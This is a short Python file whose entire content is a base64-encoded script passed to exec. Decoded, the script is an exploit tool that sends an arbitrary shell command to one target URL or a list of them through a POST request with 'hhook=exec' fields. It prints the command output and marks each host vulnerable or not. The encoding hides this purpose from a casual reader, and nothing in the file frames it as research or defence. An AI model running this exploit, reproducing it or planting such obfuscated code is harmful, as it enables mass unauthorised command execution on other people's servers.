
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3lzCmltcG9ydCB0aW1lCgojIEFOU0kgY29sb3IgY29kZXMKR1JFRU4gPSAiXDAzM1szMm0iClJFRCA9ICJcMDMzWzMxbSIKQk9MRCA9ICJcMDMzWzFtIgpSRVNFVCA9ICJcMDMzWzBtIgoKIyBGdW5jdGlvbiB0byBwYXJzZSBjb21tYW5kIGxpbmUgb3B0aW9ucwpkZWYgcGFyc2Vfb3B0aW9ucygpOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IkV4ZWN1dGUgY29tbWFuZHMgb24gdGFyZ2V0IFVSTHMuIikKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy1mJywgJy0tZmlsZScsIGRlc3Q9J2ZpbGUnLCBoZWxwPSdGaWxlIGNvbnRhaW5pbmcgdGFyZ2V0IFVSTHMnKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgnLXUnLCAnLS11cmwnLCBkZXN0PSd1cmwnLCBoZWxwPSdTaW5nbGUgdGFyZ2V0IFVSTCcpCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctYycsICctLWNtZCcsIGRlc3Q9J2NtZCcsIGhlbHA9J0NvbW1hbmQgdG8gZXhlY3V0ZScsIHJlcXVpcmVkPVRydWUpCiAgICByZXR1cm4gcGFyc2VyLnBhcnNlX2FyZ3MoKQoKIyBGdW5jdGlvbiB0byBzZW5kIHRoZSBQT1NUIHJlcXVlc3QgYW5kIHJldHJpZXZlIHRoZSBvdXRwdXQKZGVmIGV4ZWN1dGVfY29tbWFuZCh1cmwsIGNtZCk6CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT17InNpZCI6ICJmb28iLCAiaGhvb2siOiAiZXhlYyIsICJ0ZXh0IjogY21kfSwgY29va2llcz17InNpZCI6ICJmb28ifSkKICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICByZXR1cm4gcmVzcG9uc2UudGV4dC5zcGxpdCgnJm5ic3A7JylbMTpdCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJ7UkVEfVshXSBFcnJvciBvbiB7dXJsfToge2V9LiBTa2lwcGluZy4uLntSRVNFVH0iKQogICAgICAgIHJldHVybiBbXQoKIyBGdW5jdGlvbiB0byBkZXRlcm1pbmUgaWYgdGhlIG91dHB1dCBpbmRpY2F0ZXMgYSB2dWxuZXJhYmlsaXR5CmRlZiB2dWxuZXJhYmxlKG91dHB1dCk6CiAgICAjIEFkanVzdCB0aGlzIGxvZ2ljIGJhc2VkIG9uIHdoYXQgaW5kaWNhdGVzIGEgdnVsbmVyYWJpbGl0eSBpbiB5b3VyIGNvbnRleHQKICAgIHJldHVybiBhbnkoInZ1bG5lcmFibGUiIGluIGxpbmUubG93ZXIoKSBmb3IgbGluZSBpbiBvdXRwdXQpCgojIEZ1bmN0aW9uIHRvIGhhbmRsZSBtdWx0aXBsZSB0YXJnZXRzCmRlZiBoYW5kbGVfbXVsdGlwbGVfdGFyZ2V0cyh0YXJnZXRzLCBjbWQpOgogICAgdG90YWxfdGFyZ2V0cyA9IGxlbih0YXJnZXRzKQogICAgdGFyZ2V0c19wcm9jZXNzZWQgPSAwCgogICAgZm9yIHRhcmdldCBpbiB0YXJnZXRzOgogICAgICAgIG91dHB1dCA9IGV4ZWN1dGVfY29tbWFuZCh0YXJnZXQsIGNtZCkKICAgICAgICBpZiB2dWxuZXJhYmxlKG91dHB1dCk6CiAgICAgICAgICAgIHByaW50KGYie0dSRUVOfVsrXSB7Qk9MRH17dGFyZ2V0fSBWdWxuZXJhYmxle1JFU0VUfSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7UkVEfVstXSB7Qk9MRH17dGFyZ2V0fSBOb3QgVnVsbmVyYWJsZXtSRVNFVH0iKQogICAgICAgIGZvciBsaW5lIGluIG91dHB1dDoKICAgICAgICAgICAgcHJpbnQoZiIgIHtsaW5lfSIpCiAgICAgICAgdGFyZ2V0c19wcm9jZXNzZWQgKz0gMQoKICAgIHJldHVybiB0b3RhbF90YXJnZXRzLCB0YXJnZXRzX3Byb2Nlc3NlZAoKIyBNYWluIGV4ZWN1dGlvbiBmbG93Cm9wdGlvbnMgPSBwYXJzZV9vcHRpb25zKCkKCmlmIG5vdCBvcHRpb25zLmZpbGUgYW5kIG5vdCBvcHRpb25zLnVybDoKICAgIHByaW50KGYiXG57Qk9MRH17UkVEfVtpXSBVc2FnZToge19fZmlsZV9ffSAtZiA8VEFSR0VUX0ZJTEU+IC11IDxVUkw+IC1jIDxDTUQ+e1JFU0VUfVxuIikKZWxpZiBub3Qgb3B0aW9ucy5jbWQ6CiAgICBwcmludChmIlxue0JPTER9e1JFRH1baV0gQ29tbWFuZCAoLWMgPENNRD4pIGlzIHJlcXVpcmVke1JFU0VUfVxuIikKZWxzZToKICAgIHByaW50KGYiXG57Qk9MRH1bK10gQ29tbWFuZCBvdXRwdXQ6e1JFU0VUfSIpCgogICAgaWYgb3B0aW9ucy5maWxlOgogICAgICAgIHdpdGggb3BlbihvcHRpb25zLmZpbGUpIGFzIGZpbGU6CiAgICAgICAgICAgIHRhcmdldHMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUgaWYgbGluZS5zdHJpcCgpXQogICAgICAgIHRvdGFsLCBwcm9jZXNzZWQgPSBoYW5kbGVfbXVsdGlwbGVfdGFyZ2V0cyh0YXJnZXRzLCBvcHRpb25zLmNtZCkKICAgIGVsaWYgb3B0aW9ucy51cmw6CiAgICAgICAgb3V0cHV0ID0gZXhlY3V0ZV9jb21tYW5kKG9wdGlvbnMudXJsLCBvcHRpb25zLmNtZCkKICAgICAgICB0b3RhbCwgcHJvY2Vzc2VkID0gMSwgMSBpZiBvdXRwdXQgZWxzZSAwCiAgICAgICAgaWYgdnVsbmVyYWJsZShvdXRwdXQpOgogICAgICAgICAgICBwcmludChmIntHUkVFTn1bK10ge0JPTER9e29wdGlvbnMudXJsfSBWdWxuZXJhYmxle1JFU0VUfSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7UkVEfVstXSB7Qk9MRH17b3B0aW9ucy51cmx9IE5vdCBWdWxuZXJhYmxle1JFU0VUfSIpCiAgICAgICAgZm9yIGxpbmUgaW4gb3V0cHV0OgogICAgICAgICAgICBwcmludChmIiAge2xpbmV9IikKCiAgICBpZiB0b3RhbCA9PSBwcm9jZXNzZWQ6CiAgICAgICAgcHJpbnQoIlxyW1Byb2Nlc3NpbmddIDEwMC4wMCUgLSBBbGwgdGFyZ2V0cyBwcm9jZXNzZWQuIikgICMgUHJpbnQgY29tcGxldGlvbiBtZXNzYWdlCiAgICAgICAgdGltZS5zbGVlcCgyKSAgIyBXYWl0IGZvciAyIHNlY29uZHMgYmVmb3JlIGNsb3NpbmcgdGhlIHNjcmlwdAogICAgICAgIHN5cy5leGl0KCkgICMgRXhpdCB0aGUgc2NyaXB0Cg=='))
